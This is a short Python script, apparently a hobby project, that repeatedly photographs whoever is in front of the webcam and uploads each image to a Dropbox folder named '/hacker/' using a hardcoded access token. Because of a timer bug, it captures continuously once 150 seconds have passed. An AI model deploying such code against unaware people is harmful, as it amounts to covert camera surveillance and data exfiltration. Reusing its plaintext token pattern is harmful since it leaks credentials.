import cv2
import random
import time
import dropbox

start_time = time.time()

def take_snapshot():
    randomNumber = random.randint(0,100)
    videoCaptureObject = cv2.VideoCapture(0)
    result = True

    while (result):
        ret, frame = videoCaptureObject.read()
        print(ret)

        img_name = "Image" + str(randomNumber) + ".jpg"
        cv2.imwrite(img_name, frame)
        start_time = time.time()

        result = False
    
    
    print("Snapshot Taken")
    videoCaptureObject.release()
    cv2.destroyAllWindows()

    return img_name

def upload_files(file_name):
    access_token = 'H5MlzHMkbDEAAAAAAAAAAZoEZ2CNGMgVP51oUy1i27ER_5p_i-XTNlGT5o4Fw-sY'
    file_from = file_name
    file_to = "/hacker/" + file_name

    dbx = dropbox.Dropbox(access_token)
    with open(file_from, "rb") as f:
            dbx.files_upload(f.read(), file_to, mode=dropbox.files.WriteMode.overwrite)
            print("File Uploaded!")


def main():
    while (True):
        if((time.time()-start_time)>=150):
            print("Inside Main")
            name = take_snapshot()
            upload_files(name)

main()
        
